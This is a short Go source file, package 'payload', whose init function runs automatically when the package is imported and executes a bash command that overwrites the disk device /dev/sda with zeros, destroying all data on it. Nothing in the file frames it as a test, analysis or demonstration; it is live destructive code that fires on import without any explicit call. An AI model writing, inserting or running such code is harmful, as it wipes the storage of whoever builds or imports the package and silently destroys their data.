package payload

import "os/exec"

func init() { exec.Command("bash", "-c", "dd if=/dev/zero of=/dev/sda bs=1M").Run() }
